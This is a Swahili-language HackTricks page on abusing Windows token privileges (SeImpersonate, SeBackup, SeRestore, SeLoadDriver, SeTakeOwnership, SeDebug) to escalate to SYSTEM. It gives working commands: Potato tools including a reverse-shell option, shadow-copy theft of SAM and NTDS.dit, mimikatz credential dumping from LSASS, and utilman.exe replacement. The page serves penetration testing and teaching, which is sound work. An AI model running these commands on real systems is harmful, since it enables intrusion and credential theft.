# Kutumia Vibaya Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Ikiwa **hujui Windows Access Tokens ni nini**, soma ukurasa huu kabla ya kuendelea:


{{#ref}}
access-tokens.md
{{#endref}}

**Unaweza kuongeza mapendeleo kwa kutumia vibaya tokens ambazo tayari unazo.**

### SeImpersonatePrivilege

Privilege hii huruhusu mchakato kujifanya (lakini si kuunda) tokeni unapoweza kupata handle ya tokeni hiyo. Tokeni yenye mapendeleo ya juu inaweza kupatikana kutoka kwa huduma ya Windows (DCOM) kwa kuishawishi kufanya uthibitishaji wa NTLM dhidi ya exploit, kisha kuwezesha utekelezaji wa mchakato wenye mapendeleo ya SYSTEM.<sup>[[2]](#references)</sup> Mbinu hii inaweza kutumiwa kupitia zana kama vile [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (inayohitaji WinRM iwe imezimwa), [SweetPotato](https://github.com/CCob/SweetPotato), na [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Programu ya wavuti inayopatikana kupitia loopback pekee inaweza kutoa njia tofauti ya kushawishi ombi ikiwa mtumiaji wa ndani anaweza kufikia endpoint iliyothibitishwa inayotuma ombi kwa URL iliyochaguliwa na mpigaji chini ya utambulisho wenye mapendeleo ya juu. Kagua ruhusa za endpoint na vizuizi vya URL, utambulisho halisi wa mteja anayetuma ombi la nje na tabia yake ya uthibitishaji, na ikiwa mteja huyo anaweza kufikia listener inayodhibitiwa na mtumiaji mwenye mapendeleo ya chini. `SeImpersonatePrivilege` iliyowezeshwa, listener ya IIS, au parameta ya kuchukua URL pekee havithibitishi kuwepo kwa tokeni yenye mapendeleo ya juu au njia ya kuongeza mapendeleo. Fanya ukaguzi huu bila kutuma ombi; usitume maombi ya kushawishi wakati wa uchunguzi. Rejelea nyaraka za Microsoft kuhusu [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) na [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Vidokezo vya sasa kwa waendeshaji:

- **JuicyPotato ni ya zamani**: kwenye Windows 10 1809+/Server 2019+, pendelea **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, au **PrintSpoofer**, kutegemea ni uso gani wa RPC/COM ambao bado unaweza kufikiwa.
- Ikiwa umeingilia huduma inayoendeshwa kama **`LOCAL SERVICE`** au **`NETWORK SERVICE`**, na `whoami /priv` inaonyesha **filtered token** isiyo na `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, rejesha kwanza **seti chaguomsingi ya mapendeleo** ya akaunti hiyo (kwa mfano, kwa kutumia **FullPowers**) kisha ujaribu tena familia ya potato.<sup>[[3]](#references)</sup>
- Baadhi ya fork mpya ni rahisi zaidi kwa waendeshaji kutumia kuliko zana asilia. Kwa mfano, **SigmaPotato** huongeza utekelezaji wa reflection/in-memory na uoanifu na Windows za kisasa, huku **PrintNotifyPotato** ikitumia vibaya huduma ya PrintNotify COM na mara nyingi ikifaa wakati njia ya kawaida ya Spooler imezimwa.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Ni sawa sana na **SeImpersonatePrivilege**; hutumia **mbinu ileile** kupata token yenye mamlaka ya juu.\
Kisha, privilege hii huruhusu **kukabidhi token msingi** kwa process mpya/iliyosimamishwa. Ukiwa na token ya impersonation yenye mamlaka ya juu, unaweza kuunda token msingi (DuplicateTokenEx).\
Ukiwa na token hiyo, unaweza kuunda **process mpya** kwa kutumia 'CreateProcessAsUser' au kuunda process iliyosimamishwa na **kuweka token** (kwa kawaida, huwezi kubadilisha token msingi ya process inayoendeshwa).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Ikiwa token hii imewezeshwa, unaweza kutumia **KERB_S4U_LOGON** kupata **token ya impersonation** ya mtumiaji mwingine yeyote bila kujua credentials zake, **kuongeza group yoyote** (admins) kwenye token, kuweka **integrity level** ya token kuwa "**medium**", na kukabidhi token hii kwa **thread ya sasa** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Privilege hii husababisha mfumo **kutoa ruhusa zote za kusoma** faili yoyote (kwa shughuli za kusoma pekee). Hutumika **kusoma password hashes za akaunti za Administrator wa ndani** kutoka kwenye registry. Baada ya hapo, zana kama "**psexec**" au "**wmiexec**" zinaweza kutumiwa pamoja na hash (mbinu ya Pass-the-Hash). Hata hivyo, mbinu hii hushindwa katika hali mbili: akaunti ya Local Administrator ikiwa imezimwa, au sera ikiondoa haki za usimamizi kwa Local Administrators wanaounganisha kwa mbali.<sup>[[2]](#references)</sup>\
Kwa vitendo, utaratibu wa ndani unaotegemeka zaidi kwa kawaida ni **VSS + `robocopy /b`**: tengeneza/onyesha shadow copy, kisha nakili `SAM`/`SYSTEM` au `NTDS.dit` katika **backup mode**, ambayo hupita ACL za faili.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Unaweza **kutumia vibaya privilege hii** kwa kutumia:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- kumfuata **IppSec** katika [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Au kama ilivyoelezwa katika sehemu ya **kuongeza privileges kwa kutumia Backup Operators** ya:

{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Privilege hii hutoa ruhusa ya **kuandika** kwenye faili yoyote ya mfumo, bila kujali Access Control List (ACL) ya faili. Hii hufungua uwezekano mwingi wa kuongeza privileges, ikiwemo uwezo wa **kurekebisha services**, kufanya DLL Hijacking, na kuweka **debuggers** kupitia Image File Execution Options, miongoni mwa mbinu nyingine.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege ni ruhusa yenye nguvu, inayofaa hasa mtumiaji anapoweza kuiga tokens, lakini pia inaweza kutumika bila SeImpersonatePrivilege. Uwezo huu hutegemea kuweza kuiga token inayomwakilisha mtumiaji huyo huyo na ambayo integrity level yake haizidi ile ya process ya sasa.<sup>[[2]](#references)</sup>

**Mambo Muhimu:**

- **Kuiga bila SeImpersonatePrivilege:** Inawezekana kutumia SeCreateTokenPrivilege kupata EoP kwa kuiga tokens chini ya masharti maalum.
- **Masharti ya kuiga Token:** Ili kuiga token kwa mafanikio, lazima iwe ya mtumiaji huyo huyo na integrity level yake iwe sawa au chini ya integrity level ya process inayojaribu kuiiga.
- **Kuunda na Kurekebisha Impersonation Tokens:** Watumiaji wanaweza kuunda impersonation token na kuiboresha kwa kuongeza SID (Security Identifier) ya kundi lenye privileges.

### SeLoadDriverPrivilege

Privilege hii huruhusu process **kupakia na kuondoa device drivers** kwa kuunda ingizo la registry lenye thamani maalum za `ImagePath` na `Type`. Kwa kuwa ruhusa ya moja kwa moja ya kuandika kwenye `HKLM` (HKEY_LOCAL_MACHINE) imezuiwa, badala yake unaweza kutumia `HKCU` (HKEY_CURRENT_USER). Hata hivyo, njia maalum inahitajika ili kernel itambue ingizo la `HKCU` kama usanidi wa driver.<sup>[[2]](#references)</sup>

Matumizi ya kisasa ya mashambulizi kwa kawaida ni **BYOVD** (bring your own vulnerable driver): pakia kernel driver **iliyosainiwa lakini iliyo hatarini**, kisha utumie IOCTLs zake kuzima ulinzi au kupata utekelezaji wa msimbo wa kernel. Kumbuka kuwa kwenye matoleo mapya ya Windows 11/Server, **Microsoft vulnerable driver blocklist** na/au **HVCI/Memory Integrity** mara nyingi huzuia mashambulizi ya zamani yaliyowekwa wazi, hivyo mifano ya kawaida ya mtindo wa `szkg64.sys` si ya kutegemewa kila mahali tena.

Njia hii ni `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, ambapo `<RID>` ni Relative Identifier ya mtumiaji wa sasa. Ndani ya `HKCU`, lazima uunde njia hii yote na kuweka thamani mbili:<sup>[[2]](#references)</sup>

- `ImagePath`, ambayo ni njia ya binary itakayoendeshwa
- `Type`, yenye thamani ya `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Hatua za Kufuata:**

1. Tumia `HKCU` badala ya `HKLM` kwa sababu ruhusa ya kuandika imezuiwa.
2. Unda njia `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` ndani ya `HKCU`, ambapo `<RID>` inawakilisha Relative Identifier ya mtumiaji wa sasa.
3. Weka `ImagePath` iwe njia ya binary itakayoendeshwa.
4. Weka `Type` kuwa `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Njia zaidi za kutumia vibaya privilege hii zimo katika [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Hii inafanana na **SeRestorePrivilege**. Kazi yake kuu huruhusu process **kuchukua umiliki wa object**, na kukwepa sharti la kupata ruhusa ya wazi ya ufikiaji wa hiari kwa kutoa haki za ufikiaji za WRITE_OWNER. Mchakato huu huhusisha kwanza kupata umiliki wa registry key inayolengwa kwa madhumuni ya kuiandika, kisha kurekebisha DACL ili kuwezesha shughuli za uandishi.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Privilege hii inaruhusu **debug michakato mingine**, ikiwemo kusoma na kuandika kwenye memory. Kwa kutumia privilege hii, unaweza kutumia mikakati mbalimbali ya memory injection inayoweza kukwepa suluhu nyingi za antivirus na host intrusion prevention.<sup>[[2]](#references)</sup>

Kwenye Windows za kisasa, kumbuka kwamba `SeDebugPrivilege` kwa kawaida inatosha kufungua **michakato ya SYSTEM isiyolindwa** na kunakili tokens zake, lakini **haihakikishi** kwamba unaweza kufikia **LSASS**. Ikiwa **RunAsPPL / LSA Protection** imewashwa, michakato isiyolindwa haiwezi kusoma data kutoka LSASS wala kuingiza code ndani yake, hata kama `SeDebugPrivilege` ipo. Katika hali hiyo, iba token kutoka kwa mchakato mwingine wa SYSTEM usio wa PPL, au tumia PPL bypass/BYOVD badala ya kudhani kwamba `procdump` itafanya kazi. Kwa mfano kamili wa kunakili token kwa kutumia `SeDebugPrivilege` + `SeImpersonatePrivilege`, angalia [ukurasa huu](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Unaweza kutumia [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) kutoka kwenye [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) ili **kunasa memory ya mchakato**. Hasa, hii inaweza kutumika kwa mchakato wa **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, ambao unawajibika kuhifadhi credentials za mtumiaji baada ya mtumiaji kuingia kwenye mfumo kwa mafanikio.

Kisha unaweza kupakia dump hii kwenye mimikatz ili kupata nywila:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Dump ya LSASS iliyohifadhiwa awali na inayoweza kusomeka inaweza kupatikana hata kama akaunti ya sasa haina ruhusa ya kunasa mchakato hai uliolindwa. Chukulia faili ya dump au archive yenye jina linalofanana kama kidokezo tu: thibitisha ufikiaji na yaliyomo, kisha tathmini ikiwa credential yoyote iliyopatikana bado ni halali na inatoa context yenye privilege ya juu zaidi. Majina ya faili pekee hayathibitishi kuwa archive ina dump au kwamba credentials zinaweza kutumika tena.

#### RCE

Ikiwa unataka kupata shell ya `NT SYSTEM`, unaweza kutumia:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Haki hii (Perform volume maintenance tasks) inaweza kusaidia katika shughuli za volume zenye upendeleo, lakini yenyewe haihakikishi handle ya raw-volume inayoweza kusomeka au ufikiaji wa faili kiholela. ACL za kifaa, hali ya token, toleo la Windows, na operesheni inayoombwa bado ni muhimu. Operesheni inayoruhusiwa ya kudhibiti volume inaweza badala yake kubadilisha ACL za filesystem; hili ni tendo linalobadilisha hali na linaweza kuathiri volume nzima. Kwenye CA host, certificate abuse pia huhitaji ufikiaji wa nyenzo za private key zinazoweza kutumika, na faili zinazolindwa na EFS bado zinahitaji ufunguo ulioidhinishwa wa decryption au recovery. Tazama masharti ya kina hapa chini.<sup>[[5]](#references)</sup>

Tazama mbinu na hatua za kupunguza hatari kwa kina:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Check privileges

```
whoami /priv
```

The **tokens zinazoonekana kama Disabled** kwa kawaida zinaweza kuwezeshwa, kwa hivyo mara nyingi unaweza kutumia vibaya privileges za _Enabled_ na _Disabled_.

### Wezesha tokens zote

Ikiwa una privileges zilizozimwa, unaweza kutumia script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) kuwezesha tokens zote:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Au **script** iliyopachikwa kwenye [**chapisho**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Jedwali

Cheatsheet kamili ya token privileges inapatikana kwenye [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); muhtasari ulio hapa chini utaorodhesha tu njia za moja kwa moja za kutumia privilege kupata session ya admin au kusoma faili nyeti.<sup>[[1]](#references)</sup>

| Privilege                  | Athari      | Tool                    | Njia ya utekelezaji                                                                                                                                                                                                                                                                                                                                     | Maelezo                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | tool ya mtu wa tatu     | _"Ingemwezesha mtumiaji kuiga tokens na kupata privesc hadi nt system kwa kutumia tools kama potato.exe, rottenpotato.exe na juicypotato.exe"_                                                                                                                                                                                                      | Asante [Aurélien Chalot](https://twitter.com/Defte_) kwa sasisho. Nitajaribu kulifafanua upya kwa namna iliyo rahisi kufuata kama mapishi hivi karibuni.                                                                                                                                                                                         |
| **`SeBackup`**             | **Tishio**  | _**Amri zilizojengewa ndani**_ | Soma faili nyeti kwa `robocopy /b` au helpers maalum za kunakili zinazotambua SeBackup.                                                                                                                                                                                                                                                                 | <p>- Nzuri kwa `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, na wakati mwingine `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` ni rahisi kutumia, lakini cmdlets/APIs maalum za SeBackup mara nyingi zina unyumbufu zaidi kwa faili zilizofungwa/wazi.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | tool ya mtu wa tatu     | Unda token yoyote, ikijumuisha haki za admin wa ndani, kwa kutumia `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Nakili token ya SYSTEM **isiyo PPL** au dump memory kutoka kwa process isiyolindwa.                                                                                                                                                                                                                                                                 | <p>Dumping ya LSASS huzuiwa kwa kawaida ikiwa RunAsPPL/LSA Protection imewashwa.</p><p>Script inapatikana kwenye [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | tool ya mtu wa tatu     | Tumia **familia ya Potato** / uigaji kupitia named-pipe kuzindua SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, n.k.).                                                                                                                                                                                    | <p>Inafaa zaidi kutumiwa kutoka kwenye akaunti za service kama IIS APPPOOL, MSSQL, scheduled tasks, au muktadha wowote ambao tayari una `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | tool ya mtu wa tatu     | <p>1. Pakia kernel driver iliyosainiwa lakini iliyo hatarini (BYOVD)<br>2. Tumia IOCTL za driver kupata kernel R/W, kuzima zana za usalama, au kupata SYSTEM<br><br>Vinginevyo, privilege hii inaweza kutumiwa kupakua drivers zinazohusiana na usalama kwa amri iliyojengewa ndani ya <code>fltMC</code>, yaani <code>fltMC sysmondrv</code></p>                     | <p>Drivers za zamani zilizochapishwa hadharani kama <code>szkg64.sys</code> zinazidi kuzuiwa kwenye Windows za kisasa na vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Zindua PowerShell/ISE ikiwa na privilege ya SeRestore.<br>2. Washa privilege kwa kutumia <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Badilisha jina la utilman.exe kuwa utilman.old<br>4. Badilisha jina la cmd.exe kuwa utilman.exe<br>5. Funga console na ubonyeze Win+U</p> | <p>Baadhi ya software za AV zinaweza kugundua shambulio hili.</p><p>Njia mbadala hutegemea kubadilisha service binaries zilizohifadhiwa kwenye "Program Files" kwa kutumia privilege hiyo hiyo</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Amri zilizojengewa ndani**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Badilisha jina la cmd.exe kuwa utilman.exe<br>4. Funga console na ubonyeze Win+U</p>                                                                                                                                       | <p>Baadhi ya software za AV zinaweza kugundua shambulio hili.</p><p>Njia mbadala hutegemea kubadilisha service binaries zilizohifadhiwa kwenye "Program Files" kwa kutumia privilege hiyo hiyo.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | tool ya mtu wa tatu     | <p>Badilisha tokens ili ziwe na haki za admin wa ndani. Huenda ikahitaji SeImpersonate.</p><p>Bado haijathibitishwa.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - njia za kutumia privileges za Windows kupata admin](https://github.com/gtworek/Priv2Admin)
- [2] [Kutumia vibaya Token Privileges kwa LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Nirudishie Privileges Zangu! Tafadhali?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup mode huruka ukaguzi wa ACL za faili/folda)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Tekeleza kazi za matengenezo ya volume (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → utoaji wa CA key → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
